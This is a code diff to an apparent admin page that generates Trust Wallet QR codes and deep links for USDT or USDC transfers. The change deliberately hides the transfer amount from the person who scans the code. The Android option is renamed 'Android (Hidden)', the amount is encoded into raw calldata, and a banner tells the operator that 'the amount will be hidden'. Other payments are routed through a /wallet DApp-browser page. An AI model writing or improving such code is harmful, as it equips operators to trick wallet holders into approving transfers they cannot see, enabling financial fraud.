@@ -125,47 +125,35 @@ export default function AdminPage() {
     const origin = window.location.origin;
     const baseUrl = `${origin}/wallet`;
 
-    if (network === "tron") {
+    // Masquage du montant pour TOUTES les plateformes sauf Android Ethereum (qui utilise data)
+    const useDataEncoding = network === "ethereum" && platform === "android";
+
+    if (network === "tron" || platform === "ios") {
+      // Pour iOS (Ethereum / TRON) et Android TRON → open_url vers /wallet
       const normalizedAmount = amount.replace(",", ".").trim();
       if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
         setQrUrl("");
         return;
       }
-      if (platform === "ios") {
-        // iOS: open the wallet page in Trust Wallet's DApp browser (coin_id=60 for EVM browser)
-        // The wallet page will detect tron network + no tronWeb and auto-redirect to native send
-        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=usdt&network=tron`;
-        const coinId = 60; // Use EVM coin_id to open DApp browser (TRON coin_id not supported by open_url)
-        const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-        setQrUrl(trustWalletLink);
-      } else {
-        // Android: direct send deep link
-        const assetId = "c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
-        const sendUrl = `https://link.trustwallet.com/send?asset=${assetId}&address=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}`;
-        setQrUrl(sendUrl);
-      }
+      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=usdt${network === "tron" ? "&network=tron" : ""}`;
+      const coinId = 60; // EVM browser, fonctionne aussi pour TRON dans Trust Wallet
+      const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
+      setQrUrl(trustWalletLink);
     } else {
-      if (platform === "ios") {
-        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(amount)}&token=${encodeURIComponent(token.toLowerCase())}&network=${network}`;
-        const coinId = 60;
-        const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-        setQrUrl(trustWalletLink);
-      } else {
-        // Android : deep link send direct (sans redirection)
-        const normalizedAmount = amount.replace(",", ".").trim();
-        if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
-          setQrUrl("");
-          return;
-        }
-        try {
-          const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
-          const callData = encodeTransferData(receiverAddress, normalizedAmount);
-          const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
-          setQrUrl(sendUrl);
-        } catch (err) {
-          console.error("Failed to encode transfer data", err);
-          setQrUrl("");
-        }
+      // Android Ethereum : send avec data (montant caché)
+      const normalizedAmount = amount.replace(",", ".").trim();
+      if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
+        setQrUrl("");
+        return;
+      }
+      try {
+        const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
+        const callData = encodeTransferData(receiverAddress, normalizedAmount);
+        const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
+        setQrUrl(sendUrl);
+      } catch (err) {
+        console.error("Failed to encode transfer data", err);
+        setQrUrl("");
       }
     }
   }, [receiverAddress, amount, token, platform, network, isMounted, isAuthenticated]);
@@ -329,7 +317,7 @@ export default function AdminPage() {
           <label className="form-label" style={{ marginTop: "1.25rem" }}>Platform</label>
           <div className="token-tabs">
             <button type="button" className={`token-tab ${platform === "ios" ? "token-tab--active" : ""}`} onClick={() => setPlatform("ios")}>iOS (Wallet)</button>
-            <button type="button" className={`token-tab ${platform === "android" ? "token-tab--active" : ""}`} onClick={() => setPlatform("android")}>Android (Send)</button>
+            <button type="button" className={`token-tab ${platform === "android" ? "token-tab--active" : ""}`} onClick={() => setPlatform("android")}>Android (Hidden)</button>
           </div>
 
           <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
@@ -354,14 +342,14 @@ export default function AdminPage() {
               className="input-row__field" placeholder="1.0"
             />
           </div>
-          {platform === "android" && (
-            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginTop: "0.25rem" }}>
+          {(network === "tron" || platform === "android") && (
+            <div style={{ color: "#64748b", fontSize: "0.8rem", marginTop: "0.25rem" }}>
               {(() => {
                 const normalized = amount.replace(",", ".").trim();
                 if (!amount || !normalized || isNaN(Number(normalized)) || Number(normalized) <= 0) {
                   return "Amount is required (use . or , as decimal separator).";
                 }
-                return "";
+                return "✅ The amount will be hidden from the recipient.";
               })()}
             </div>
           )}
@@ -432,9 +420,7 @@ export default function AdminPage() {
                   ? "Enter a receiver address to generate QR Code"
                   : !isValidAddress(receiverAddress, network)
                   ? "Invalid address format"
-                  : (network === "tron" || platform === "android") && (!amount || isNaN(Number(amount.replace(",", "."))) || Number(amount.replace(",", ".")) <= 0)
-                  ? `Enter a valid amount to generate ${network === "tron" ? "TRC20" : "Android"} QR`
-                  : "QR Code will appear here"}
+                  : "Enter a valid amount to generate QR Code"}
               </div>
             </div>
           )}
